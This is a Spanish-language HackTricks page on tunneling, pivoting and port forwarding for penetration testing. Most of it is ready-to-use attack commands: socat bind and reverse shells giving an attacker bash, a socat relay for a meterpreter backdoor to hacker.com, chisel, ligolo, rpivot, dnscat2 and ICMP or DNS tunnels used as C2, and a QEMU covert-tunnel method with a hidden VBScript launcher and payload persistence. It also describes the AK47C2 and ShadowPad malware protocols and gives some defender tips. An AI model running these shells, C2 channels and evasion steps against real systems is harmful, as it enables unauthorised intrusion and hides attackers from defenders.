# Tunneling y Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Consejo de Nmap

> [!WARNING]
> Los escaneos **ICMP** y **SYN** no se pueden tunelizar a través de proxies socks, por lo que debemos **deshabilitar el descubrimiento mediante ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Conexión gráfica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Abrir un nuevo puerto en el SSH Server --> Otro puerto
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Puerto local --> Host comprometido (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Puerto local --> Host comprometido (SSH) --> Donde sea
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Esto es útil para obtener reverse shells desde hosts internos a través de una DMZ hasta tu host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Necesitas **root en ambos dispositivos** (ya que vas a crear nuevas interfaces) y la configuración de sshd debe permitir el inicio de sesión de root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Habilitar el forwarding en el servidor
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Configura una nueva ruta en el lado del cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Seguridad – Terrapin Attack (CVE-2023-48795)**
> El ataque de downgrade Terrapin de 2023 puede permitir que un man-in-the-middle manipule el handshake inicial de SSH e inyecte datos en **cualquier canal reenviado** ( `-L`, `-R`, `-D` ). Asegúrate de que tanto el cliente como el servidor estén parcheados (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o deshabilita explícitamente los algoritmos vulnerables `chacha20-poly1305@openssh.com` y `*-etm@openssh.com` en `sshd_config`/`ssh_config` antes de confiar en los túneles SSH.

## SSHUTTLE

Puedes **tunelizar** mediante **ssh** todo el **tráfico** hacia una **subred** a través de un host.\
Por ejemplo, reenviar todo el tráfico dirigido a 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Conectar con una clave privada
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Puerto local --> Host comprometido (sesión activa) --> Third_box:Puerto
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Otra forma:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Abre un puerto en el teamserver que escuche en todas las interfaces y que pueda utilizarse para **enrutar el tráfico a través del beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> En este caso, el **puerto se abre en el beacon host**, no en el Team Server, y el tráfico se envía al Team Server y, desde allí, al host:port indicado
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Para tener en cuenta:

- El reverse port forward de Beacon está diseñado para **tunelizar el tráfico al Team Server, no para retransmitirlo entre máquinas individuales**.
- El tráfico se **tuneliza dentro del tráfico C2 de Beacon**, incluidos los enlaces P2P.
- **No se requieren privilegios de administrador** para crear reverse port forwards en puertos altos.

### rPort2Port local

> [!WARNING]
> En este caso, el **puerto se abre en el host de Beacon**, no en el Team Server, y el **tráfico se envía al cliente de Cobalt Strike** (no al Team Server) y desde ahí al host:puerto indicado
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Necesitas subir un archivo web para el túnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Puedes descargarlo desde la página de releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Debes usar la **misma versión para el cliente y el servidor**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Usa la misma versión para el agent y el proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Vinculación y escucha del agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Acceder a los puertos locales del agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Túnel inverso. El túnel se inicia desde la víctima.\
Se crea un proxy socks4 en 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot a través de **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port a través de socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter a través de SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Puedes bypass un **proxy sin autenticación** ejecutando esta línea en lugar de la última en la consola de la víctima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Túnel SSL de Socat

**/bin/sh console**

Crea certificados en ambos lados: Cliente y Servidor
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Conecta el puerto SSH local (22) al puerto 443 del host del atacante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).

Como este binario se ejecutará en la víctima y es un cliente ssh, debemos abrir nuestro servicio y puerto ssh para poder recibir una conexión inversa. Después, para reenviar un puerto accesible únicamente de forma local a un puerto de nuestra máquina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Necesitas ser administrador local (para cualquier puerto)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Necesitas tener **acceso RDP al sistema**.\
Descarga:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases): esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la función Remote Desktop Service de Windows. DVC se encarga de **tunelizar paquetes a través de la conexión RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

En tu equipo cliente, carga **`SocksOverRDP-Plugin.dll`** de la siguiente manera:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ahora podemos **conectarnos** a la **víctima** mediante **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **aviso** indicando que el **plugin SocksOverRDP está habilitado** y que **escuchará** en **127.0.0.1:1080**.

**Conéctate** mediante **RDP** y carga y ejecuta el binario `SocksOverRDP-Server.exe` en la máquina víctima:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ahora, confirma en tu máquina (atacante) que el puerto 1080 está escuchando:
```
netstat -antb | findstr 1080
```
Ahora puedes usar [**Proxifier**](https://www.proxifier.com/) **para redirigir el tráfico a través de ese puerto.**

## Proxificar aplicaciones GUI de Windows

Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy usando [**Proxifier**](https://www.proxifier.com/).\
En **Profile -> Proxy Servers**, añade la IP y el puerto del servidor SOCKS.\
En **Profile -> Proxification Rules**, añade el nombre del programa que quieres proxificar y las conexiones a las IP que quieres proxificar.

## Bypass de proxy NTLM

La herramienta mencionada anteriormente: **Rpivot**\
**OpenVPN** también puede evadirlo configurando estas opciones en el archivo de configuración:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Se autentica contra un proxy y vincula localmente un puerto que se reenvía al servicio externo que especifiques. Después, puedes usar la herramienta que prefieras a través de este puerto.\
Por ejemplo, reenviar ese puerto 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Ahora, si configuras, por ejemplo, el servicio **SSH** en la víctima para que escuche en el puerto 443, puedes conectarte a él a través del puerto 2222 del atacante.\
También podrías usar un **meterpreter** que se conecte a localhost:443 mientras el atacante escucha en el puerto 2222.

## YARP

Un reverse proxy creado por Microsoft. Puedes encontrarlo aquí: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Se necesita root en ambos sistemas para crear adaptadores tun y tunelizar datos entre ellos mediante consultas DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
El túnel será muy lento. Puedes crear una conexión SSH comprimida a través de este túnel usando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Descárgalo desde aquí**](https://github.com/iagox86/dnscat2)**.**

Establece un canal de C\&C a través de DNS. No necesita privilegios de root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **En PowerShell**

Puedes usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para ejecutar un cliente dnscat2 en powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding con dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Cambiar el DNS de proxychains

Proxychains intercepta la llamada `gethostbyname` de libc y tuneliza la solicitud DNS tcp a través del proxy socks. De forma **predeterminada**, el servidor **DNS** que usa proxychains es **4.2.2.2** (codificado directamente). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un **entorno Windows**, podrías establecer la IP del **controlador de dominio**.

## Túneles en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

El actor Storm-2603 creó un **C2 de doble canal ("AK47C2")** que abusa únicamente del tráfico **DNS** saliente y **HTTP POST plano** – dos protocolos que rara vez están bloqueados en las redes corporativas.<sup>[[2]](#references)</sup>

1. **Modo DNS (AK47DNS)**
• Genera un SessionID aleatorio de 5 caracteres (p. ej., `H4T14`).
• Antecede `1` para *solicitudes de tareas* o `2` para *resultados* y concatena diferentes campos (flags, SessionID, nombre del equipo).
• Cada campo se **cifra mediante XOR con la clave ASCII `VHBD@H`**, se codifica en hexadecimal y se une con puntos, terminando finalmente con el dominio controlado por el atacante:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Las solicitudes usan `DnsQuery()` para registros **TXT** (y registros **MG** como fallback).
• Cuando la respuesta supera 0xFF bytes, el backdoor **fragmenta** los datos en piezas de 63 bytes e inserta los marcadores:
`s<SessionID>t<TOTAL>p<POS>` para que el servidor C2 pueda reordenarlas.

2. **Modo HTTP (AK47HTTP)**
• Construye un contenedor JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Todo el blob se somete a XOR con `VHBD@H` → hexadecimal → y se envía como el cuerpo de un **`POST /`** con la cabecera `Content-Type: text/plain`.
• La respuesta sigue la misma codificación y el campo `cmd` se ejecuta con `cmd.exe /c <command> 2>&1`.

Notas para Blue Team
• Busca **consultas TXT** inusuales cuya primera etiqueta sea hexadecimal larga y que siempre terminen en un dominio poco común.
• Una clave XOR constante seguida de ASCII-hex es fácil de detectar con YARA: `6?56484244?484` (`VHBD@H` en hexadecimal).
• Para HTTP, marca los cuerpos de solicitudes POST text/plain que sean hexadecimal puro y tengan un número par de bytes.

{{#note}}
Todo el canal cabe dentro de **consultas compatibles con el estándar RFC** y mantiene cada etiqueta de subdominio por debajo de 63 bytes, lo que lo hace sigiloso en la mayoría de los logs DNS.
{{#endnote}}

## Túnel ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Se necesita root en ambos sistemas para crear adaptadores tun y tunelizar datos entre ellos mediante solicitudes de eco ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Descárgalo desde aquí**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **es una herramienta para exponer soluciones a Internet con una sola línea de comandos.**\
_Las URI de exposición son:_ **UID.ngrok.io**

### Instalación

- Crea una cuenta: https://ngrok.com/signup
- Descarga del cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentación:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_También es posible añadir autenticación y TLS, si es necesario._

#### Tunelización TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exponer archivos con HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing de llamadas HTTP

_Útil para XSS,SSRF,SSTI ..._\
Directamente desde stdout o en la interfaz HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling de servicio HTTP interno
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Ejemplo de configuración sencilla de ngrok.yaml

Abre 3 túneles:

- 2 TCP
- 1 HTTP con exposición de archivos estáticos desde /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

El daemon `cloudflared` de Cloudflare puede crear túneles salientes que exponen **servicios TCP/UDP locales** sin requerir reglas de firewall entrantes, utilizando el edge de Cloudflare como punto de encuentro. Esto resulta muy útil cuando el firewall de egreso solo permite tráfico HTTPS, pero las conexiones entrantes están bloqueadas.

### One-liner de túnel rápido
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Túneles persistentes con DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Inicia el conector:
```bash
cloudflared tunnel run mytunnel
```
Como todo el tráfico sale del host **de forma saliente por el puerto 443**, los túneles de Cloudflared son una forma sencilla de eludir las ACL de ingress o los límites de NAT. Ten en cuenta que el binario normalmente se ejecuta con privilegios elevados; usa containers o el flag `--user` cuando sea posible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) es un reverse-proxy de Go mantenido activamente que admite **TCP, UDP, HTTP/S, SOCKS y P2P NAT-hole-punching**. A partir de la **v0.53.0 (mayo de 2024)**, puede actuar como un **SSH Tunnel Gateway**, de modo que un host objetivo puede iniciar un reverse tunnel usando únicamente el cliente OpenSSH incluido en el sistema, sin necesidad de ningún binario adicional.

### Túnel TCP reverse clásico
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Uso del nuevo gateway SSH (sin binario frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
El comando anterior publica el puerto **8080** de la víctima como **attacker_ip:9000** sin implementar herramientas adicionales; es ideal para el pivoting living-off-the-land.

## Túneles encubiertos basados en VM con QEMU

La red en modo usuario de QEMU (`-netdev user`) admite una opción llamada `hostfwd` que **vincula un puerto TCP/UDP en el *host* y lo reenvía al *guest***. Cuando el guest ejecuta un daemon SSH completo, la regla `hostfwd` te proporciona un jump box SSH desechable que reside completamente dentro de una VM efímera; es perfecto para ocultar el tráfico C2 de EDR, porque toda la actividad y los archivos maliciosos permanecen en el disco virtual.<sup>[[1]](#references)</sup>

### Comando rápido de una línea
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• El comando anterior inicia una imagen de **Tiny Core Linux** (`tc.qcow2`) en la RAM.
• El puerto **2222/tcp** del host Windows se reenvía de forma transparente al **22/tcp** dentro del guest.
• Desde el punto de vista del atacante, el objetivo simplemente expone el puerto 2222; cualquier paquete que llegue a él es gestionado por el servidor SSH que se ejecuta en la VM.

### Inicio sigiloso mediante VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Ejecutar el script con `cscript.exe //B update.vbs` mantiene la ventana oculta.

### Persistencia dentro del guest

Como Tiny Core no conserva el estado, los atacantes normalmente:

1. Dejan el payload en `/opt/123.out`
2. Añaden lo siguiente a `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Añaden `home/tc` y `opt` a `/opt/filetool.lst` para que el payload se empaquete en `mydata.tgz` durante el apagado.

### Por qué esto evade la detección

• Solo dos ejecutables sin firma (`qemu-system-*.exe`) escriben en el disco; no se instalan drivers ni servicios.
• Los productos de seguridad del host ven **tráfico loopback benigno** (el C2 real termina dentro de la VM).
• Los memory scanners nunca analizan el espacio de procesos malicioso porque vive en un OS diferente.

### Consejos para Defender

• Generar alertas ante **binarios QEMU/VirtualBox/KVM inesperados** en rutas con permisos de escritura para el usuario.
• Bloquear las conexiones salientes originadas por `qemu-system*.exe`.
• Buscar puertos de escucha poco frecuentes (2222, 10022, …) que se vinculen inmediatamente después del lanzamiento de QEMU.

## Nodos relay IIS/HTTP.sys mediante `HttpAddUrl` (ShadowPad)

El módulo IIS de ShadowPad de Ink Dragon convierte cada servidor web perimetral comprometido en una **backdoor + relay** de doble propósito, vinculando prefijos URL encubiertos directamente en la capa HTTP.sys:<sup>[[3]](#references)</sup>

* **Valores predeterminados de configuración** – si la configuración JSON del módulo omite valores, este recurre a valores predeterminados creíbles de IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). De esta forma, IIS responde al tráfico benigno con el branding correcto.
* **Intercepción mediante wildcard** – los operadores proporcionan una lista de prefijos URL separados por punto y coma (wildcards en el host y la ruta). El módulo llama a `HttpAddUrl` para cada entrada, por lo que HTTP.sys enruta las solicitudes coincidentes al handler malicioso *antes* de que la solicitud llegue a los módulos de IIS.
* **Primer paquete cifrado** – los dos primeros bytes del body de la solicitud contienen la seed para un PRNG personalizado de 32 bits. Cada byte posterior se somete a XOR con el keystream generado antes del parsing del protocolo:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Orquestación del relay** – el módulo mantiene dos listas: “servers” (nodos upstream) y “clients” (implants downstream). Las entradas se eliminan si no llega un heartbeat en aproximadamente 30 segundos. Cuando ambas listas no están vacías, empareja el primer server saludable con el primer client saludable y simplemente canaliza los bytes entre sus sockets hasta que uno de los lados se cierra.
* **Telemetría de depuración** – el logging opcional registra la IP de origen, la IP de destino y el total de bytes reenviados para cada emparejamiento. Los investigadores utilizaron esas pistas para reconstruir la mesh de ShadowPad que abarcaba múltiples víctimas.

---

## Otras herramientas que se deben comprobar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Referencias

- [1] [Ocultos en las sombras: túneles encubiertos mediante virtualización QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Antes de ToolShell: análisis de las operaciones anteriores de ransomware de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Dentro de Ink Dragon: revelación de la red relay y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
